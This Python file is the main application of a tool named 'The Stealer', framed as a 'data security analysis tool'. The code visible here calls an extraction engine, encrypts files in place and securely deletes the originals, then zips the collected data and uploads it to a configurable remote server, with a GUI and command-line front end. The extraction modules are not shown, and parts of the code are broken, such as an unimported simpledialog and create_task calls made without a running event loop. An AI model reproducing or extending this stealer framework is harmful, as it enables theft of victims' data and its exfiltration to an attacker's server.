"""
The Stealer - Enhanced Main Application
Advanced Data Security Analysis Tool with Modern Architecture

This is the enhanced version of the main application with 500% improvements
including better security, performance, and user experience.
"""

import asyncio
import logging
import os
import sys
import json
import yaml
from pathlib import Path
from typing import Dict, Any, Optional, List
from dataclasses import dataclass
import argparse
from datetime import datetime

# Import enhanced core modules
from core.security_manager import SecurityManager
from core.extraction_engine import ExtractionEngine
from core.encryption_manager import EncryptionManager
from core.communication_handler import CommunicationHandler, CommunicationConfig

# Import GUI components
try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

@dataclass
class ApplicationConfig:
    """Application configuration."""
    config_file: str = "config/settings.yaml"
    log_level: str = "INFO"
    gui_enabled: bool = True
    debug_mode: bool = False
    data_directory: str = "data"
    temp_directory: str = "temp"

class StealerApplication:
    """
    Enhanced Stealer Application with modern architecture and advanced features.
    """
    
    def __init__(self, config: Optional[ApplicationConfig] = None):
        """
        Initialize the application.
        
        Args:
            config: Application configuration
        """
        self.config = config or ApplicationConfig()
        self.logger = self._setup_logging()
        
        # Initialize core components
        self.security_manager = None
        self.extraction_engine = None
        self.encryption_manager = None
        self.communication_handler = None
        
        # Application state
        self.is_initialized = False
        self.current_session = None
        self.extracted_data = {}
        
        self.logger.info("Stealer Application initialized")
    
    def _setup_logging(self) -> logging.Logger:
        """Setup application logging."""
        # Create logs directory
        os.makedirs("logs", exist_ok=True)
        
        # Configure logging
        logging.basicConfig(
            level=getattr(logging, self.config.log_level),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'logs/stealer_{datetime.now().strftime("%Y%m%d")}.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        return logging.getLogger(__name__)
    
    async def initialize(self):
        """Initialize all application components."""
        try:
            self.logger.info("Initializing application components...")
            
            # Load configuration
            await self._load_configuration()
            
            # Initialize security manager
            self.security_manager = SecurityManager()
            self.logger.info("Security manager initialized")
            
            # Initialize encryption manager
            self.encryption_manager = EncryptionManager()
            self.logger.info("Encryption manager initialized")
            
            # Initialize extraction engine
            self.extraction_engine = ExtractionEngine()
            self.logger.info("Extraction engine initialized")
            
            # Initialize communication handler if configured
            if hasattr(self, 'comm_config') and self.comm_config:
                self.communication_handler = CommunicationHandler(self.comm_config)
                await self.communication_handler.initialize()
                self.logger.info("Communication handler initialized")
            
            # Create necessary directories
            os.makedirs(self.config.data_directory, exist_ok=True)
            os.makedirs(self.config.temp_directory, exist_ok=True)
            
            self.is_initialized = True
            self.logger.info("Application initialization completed successfully")
            
        except Exception as e:
            self.logger.error(f"Application initialization failed: {e}")
            raise
    
    async def _load_configuration(self):
        """Load application configuration."""
        try:
            config_path = Path(self.config.config_file)
            
            if config_path.exists():
                with open(config_path, 'r', encoding='utf-8') as f:
                    if config_path.suffix == '.yaml':
                        config_data = yaml.safe_load(f)
                    else:
                        config_data = json.load(f)
                
                # Apply configuration
                if 'communication' in config_data:
                    comm_config = config_data['communication']
                    self.comm_config = CommunicationConfig(
                        server_url=comm_config.get('server_url', ''),
                        api_key=comm_config.get('api_key', ''),
                        timeout=comm_config.get('timeout', 30),
                        retry_attempts=comm_config.get('retry_attempts', 3),
                        verify_ssl=comm_config.get('verify_ssl', True),
                        encryption_enabled=comm_config.get('encryption_enabled', True),
                        compression_enabled=comm_config.get('compression_enabled', True)
                    )
                
                self.logger.info("Configuration loaded successfully")
            else:
                self.logger.warning("Configuration file not found, using defaults")
                
        except Exception as e:
            self.logger.error(f"Configuration loading failed: {e}")
            raise
    
    async def run_extraction(self, target_path: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Run data extraction with specified options.
        
        Args:
            target_path: Path to save extracted data
            options: Extraction options
            
        Returns:
            Extraction results
        """
        try:
            if not self.is_initialized:
                await self.initialize()
            
            self.logger.info(f"Starting data extraction to: {target_path}")
            
            # Configure extraction options
            if options:
                self.extraction_engine.config.update(options)
            
            # Run extraction
            results = await self.extraction_engine.extract_all_data(target_path)
            
            # Store results
            self.extracted_data = results
            
            # Generate summary
            summary = self._generate_extraction_summary(results)
            
            self.logger.info("Data extraction completed successfully")
            return {
                'success': True,
                'results': results,
                'summary': summary,
                'target_path': target_path
            }
            
        except Exception as e:
            self.logger.error(f"Data extraction failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _generate_extraction_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate extraction summary."""
        try:
            summary = {
                'total_extractors': len(results),
                'successful_extractions': 0,
                'failed_extractions': 0,
                'total_data_size': 0,
                'extraction_time': datetime.now().isoformat()
            }
            
            for extractor_name, result in results.items():
                if result.success:
                    summary['successful_extractions'] += 1
                    if result.metadata and 'file_path' in result.metadata:
                        file_path = result.metadata['file_path']
                        if os.path.exists(file_path):
                            summary['total_data_size'] += os.path.getsize(file_path)
                else:
                    summary['failed_extractions'] += 1
            
            return summary
            
        except Exception as e:
            self.logger.error(f"Summary generation failed: {e}")
            return {'error': str(e)}
    
    async def encrypt_data(self, data_path: str, password: str) -> bool:
        """
        Encrypt extracted data.
        
        Args:
            data_path: Path to data to encrypt
            password: Encryption password
            
        Returns:
            True if successful
        """
        try:
            if not self.encryption_manager:
                raise ValueError("Encryption manager not initialized")
            
            self.logger.info(f"Encrypting data at: {data_path}")
            
            # Generate encryption key
            key, salt = self.encryption_manager.generate_master_key(password)
            
            # Encrypt all files in directory
            for root, dirs, files in os.walk(data_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_path = file_path + '.encrypted'
                    
                    success = self.encryption_manager.encrypt_file(
                        file_path, encrypted_path, key, 'AES-GCM'
                    )
                    
                    if success:
                        # Securely delete original file
                        self.encryption_manager.secure_delete_file(file_path)
                        os.rename(encrypted_path, file_path)
                    else:
                        self.logger.error(f"Failed to encrypt file: {file_path}")
                        return False
            
            self.logger.info("Data encryption completed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Data encryption failed: {e}")
            return False
    
    async def decrypt_data(self, data_path: str, password: str) -> bool:
        """
        Decrypt data.
        
        Args:
            data_path: Path to encrypted data
            password: Decryption password
            
        Returns:
            True if successful
        """
        try:
            if not self.encryption_manager:
                raise ValueError("Encryption manager not initialized")
            
            self.logger.info(f"Decrypting data at: {data_path}")
            
            # Generate decryption key (same as encryption)
            key, salt = self.encryption_manager.generate_master_key(password)
            
            # Decrypt all files in directory
            for root, dirs, files in os.walk(data_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    decrypted_path = file_path + '.decrypted'
                    
                    success = self.encryption_manager.decrypt_file(
                        file_path, decrypted_path, key
                    )
                    
                    if success:
                        # Replace encrypted file with decrypted version
                        os.remove(file_path)
                        os.rename(decrypted_path, file_path)
                    else:
                        self.logger.error(f"Failed to decrypt file: {file_path}")
                        return False
            
            self.logger.info("Data decryption completed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Data decryption failed: {e}")
            return False
    
    async def transmit_data(self, data_path: str, endpoint: str) -> bool:
        """
        Transmit data to remote server.
        
        Args:
            data_path: Path to data to transmit
            endpoint: Server endpoint
            
        Returns:
            True if successful
        """
        try:
            if not self.communication_handler:
                raise ValueError("Communication handler not initialized")
            
            self.logger.info(f"Transmitting data to: {endpoint}")
            
            # Create data package
            package_path = os.path.join(self.config.temp_directory, "data_package.zip")
            await self._create_data_package(data_path, package_path)
            
            # Upload package
            result = await self.communication_handler.upload_file(
                endpoint, package_path, {'timestamp': datetime.now().isoformat()}
            )
            
            # Clean up
            if os.path.exists(package_path):
                os.remove(package_path)
            
            if result.success:
                self.logger.info("Data transmission completed successfully")
                return True
            else:
                self.logger.error(f"Data transmission failed: {result.error}")
                return False
                
        except Exception as e:
            self.logger.error(f"Data transmission failed: {e}")
            return False
    
    async def _create_data_package(self, data_path: str, package_path: str):
        """Create compressed data package."""
        try:
            import zipfile
            
            with zipfile.ZipFile(package_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(data_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, data_path)
                        zipf.write(file_path, arcname)
            
            self.logger.debug(f"Data package created: {package_path}")
            
        except Exception as e:
            self.logger.error(f"Package creation failed: {e}")
            raise
    
    def run_gui(self):
        """Run graphical user interface."""
        if not GUI_AVAILABLE:
            self.logger.error("GUI not available - tkinter not installed")
            return
        
        try:
            root = tk.Tk()
            app_gui = StealerGUI(root, self)
            app_gui.run()
        except Exception as e:
            self.logger.error(f"GUI execution failed: {e}")
    
    async def cleanup(self):
        """Cleanup application resources."""
        try:
            if self.communication_handler:
                await self.communication_handler.close()
            
            # Clean up temporary files
            if os.path.exists(self.config.temp_directory):
                import shutil
                shutil.rmtree(self.config.temp_directory)
            
            self.logger.info("Application cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Cleanup failed: {e}")

class StealerGUI:
    """Enhanced GUI for the Stealer application."""
    
    def __init__(self, root: tk.Tk, app: StealerApplication):
        """
        Initialize the GUI.
        
        Args:
            root: Tkinter root window
            app: Stealer application instance
        """
        self.root = root
        self.app = app
        self.logger = logging.getLogger(__name__)
        
        self._setup_window()
        self._create_widgets()
    
    def _setup_window(self):
        """Setup the main window."""
        self.root.title("The Stealer - Enhanced Data Security Analysis Tool")
        self.root.geometry("1200x800")
        self.root.configure(bg='#2b2b2b')
        
        # Configure style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TLabel', background='#2b2b2b', foreground='white')
        style.configure('TButton', background='#404040', foreground='white')
        style.configure('TFrame', background='#2b2b2b')
    
    def _create_widgets(self):
        """Create GUI widgets."""
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Title
        title_label = ttk.Label(main_frame, text="The Stealer - Enhanced Edition", 
                               font=('Arial', 16, 'bold'))
        title_label.pack(pady=(0, 20))
        
        # Control buttons frame
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.pack(fill='x', pady=(0, 20))
        
        # Buttons
        ttk.Button(buttons_frame, text="Extract Data", 
                  command=self._extract_data).pack(side='left', padx=(0, 10))
        ttk.Button(buttons_frame, text="Encrypt Data", 
                  command=self._encrypt_data).pack(side='left', padx=(0, 10))
        ttk.Button(buttons_frame, text="Decrypt Data", 
                  command=self._decrypt_data).pack(side='left', padx=(0, 10))
        ttk.Button(buttons_frame, text="Transmit Data", 
                  command=self._transmit_data).pack(side='left', padx=(0, 10))
        
        # Status frame
        status_frame = ttk.LabelFrame(main_frame, text="Status")
        status_frame.pack(fill='both', expand=True)
        
        # Status text
        self.status_text = tk.Text(status_frame, height=20, bg='#1e1e1e', 
                                  fg='#00ff00', font=('Consolas', 10))
        self.status_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(status_frame, orient='vertical', 
                                 command=self.status_text.yview)
        scrollbar.pack(side='right', fill='y')
        self.status_text.configure(yscrollcommand=scrollbar.set)
    
    def _log_message(self, message: str):
        """Log message to GUI."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.status_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.status_text.see(tk.END)
        self.root.update()
    
    def _extract_data(self):
        """Extract data button handler."""
        try:
            target_path = filedialog.askdirectory(title="Select extraction target directory")
            if target_path:
                self._log_message(f"Starting data extraction to: {target_path}")
                
                # Run extraction in background
                asyncio.create_task(self._run_extraction_async(target_path))
        except Exception as e:
            self._log_message(f"Extraction failed: {e}")
            messagebox.showerror("Error", f"Extraction failed: {e}")
    
    async def _run_extraction_async(self, target_path: str):
        """Run extraction asynchronously."""
        try:
            result = await self.app.run_extraction(target_path)
            if result['success']:
                self._log_message("Data extraction completed successfully")
                self._log_message(f"Summary: {result['summary']}")
            else:
                self._log_message(f"Extraction failed: {result['error']}")
        except Exception as e:
            self._log_message(f"Extraction error: {e}")
    
    def _encrypt_data(self):
        """Encrypt data button handler."""
        try:
            data_path = filedialog.askdirectory(title="Select data directory to encrypt")
            if data_path:
                password = tk.simpledialog.askstring("Password", "Enter encryption password:", show='*')
                if password:
                    self._log_message(f"Encrypting data at: {data_path}")
                    asyncio.create_task(self._run_encryption_async(data_path, password))
        except Exception as e:
            self._log_message(f"Encryption failed: {e}")
            messagebox.showerror("Error", f"Encryption failed: {e}")
    
    async def _run_encryption_async(self, data_path: str, password: str):
        """Run encryption asynchronously."""
        try:
            success = await self.app.encrypt_data(data_path, password)
            if success:
                self._log_message("Data encryption completed successfully")
            else:
                self._log_message("Data encryption failed")
        except Exception as e:
            self._log_message(f"Encryption error: {e}")
    
    def _decrypt_data(self):
        """Decrypt data button handler."""
        try:
            data_path = filedialog.askdirectory(title="Select encrypted data directory")
            if data_path:
                password = tk.simpledialog.askstring("Password", "Enter decryption password:", show='*')
                if password:
                    self._log_message(f"Decrypting data at: {data_path}")
                    asyncio.create_task(self._run_decryption_async(data_path, password))
        except Exception as e:
            self._log_message(f"Decryption failed: {e}")
            messagebox.showerror("Error", f"Decryption failed: {e}")
    
    async def _run_decryption_async(self, data_path: str, password: str):
        """Run decryption asynchronously."""
        try:
            success = await self.app.decrypt_data(data_path, password)
            if success:
                self._log_message("Data decryption completed successfully")
            else:
                self._log_message("Data decryption failed")
        except Exception as e:
            self._log_message(f"Decryption error: {e}")
    
    def _transmit_data(self):
        """Transmit data button handler."""
        try:
            data_path = filedialog.askdirectory(title="Select data directory to transmit")
            if data_path:
                endpoint = tk.simpledialog.askstring("Endpoint", "Enter server endpoint:")
                if endpoint:
                    self._log_message(f"Transmitting data to: {endpoint}")
                    asyncio.create_task(self._run_transmission_async(data_path, endpoint))
        except Exception as e:
            self._log_message(f"Transmission failed: {e}")
            messagebox.showerror("Error", f"Transmission failed: {e}")
    
    async def _run_transmission_async(self, data_path: str, endpoint: str):
        """Run transmission asynchronously."""
        try:
            success = await self.app.transmit_data(data_path, endpoint)
            if success:
                self._log_message("Data transmission completed successfully")
            else:
                self._log_message("Data transmission failed")
        except Exception as e:
            self._log_message(f"Transmission error: {e}")
    
    def run(self):
        """Run the GUI."""
        self.root.mainloop()

async def main():
    """Main application entry point."""
    parser = argparse.ArgumentParser(description="The Stealer - Enhanced Data Security Analysis Tool")
    parser.add_argument('--config', default='config/settings.yaml', help='Configuration file path')
    parser.add_argument('--gui', action='store_true', help='Run GUI mode')
    parser.add_argument('--extract', help='Extract data to specified path')
    parser.add_argument('--encrypt', help='Encrypt data at specified path')
    parser.add_argument('--decrypt', help='Decrypt data at specified path')
    parser.add_argument('--transmit', help='Transmit data to server')
    parser.add_argument('--password', help='Password for encryption/decryption')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    # Create application configuration
    config = ApplicationConfig(
        config_file=args.config,
        debug_mode=args.debug,
        gui_enabled=args.gui
    )
    
    # Create application
    app = StealerApplication(config)
    
    try:
        # Initialize application
        await app.initialize()
        
        # Handle command line arguments
        if args.extract:
            result = await app.run_extraction(args.extract)
            print(f"Extraction result: {result}")
        
        elif args.encrypt and args.password:
            success = await app.encrypt_data(args.encrypt, args.password)
            print(f"Encryption result: {success}")
        
        elif args.decrypt and args.password:
            success = await app.decrypt_data(args.decrypt, args.password)
            print(f"Decryption result: {success}")
        
        elif args.transmit:
            success = await app.transmit_data(args.transmit, '/upload')
            print(f"Transmission result: {success}")
        
        elif args.gui:
            app.run_gui()
        
        else:
            # Default: run GUI if available
            if GUI_AVAILABLE:
                app.run_gui()
            else:
                print("GUI not available. Use --help for command line options.")
    
    except KeyboardInterrupt:
        print("\nApplication interrupted by user")
    
    except Exception as e:
        print(f"Application error: {e}")
        logging.error(f"Application error: {e}")
    
    finally:
        await app.cleanup()

if __name__ == "__main__":
    asyncio.run(main())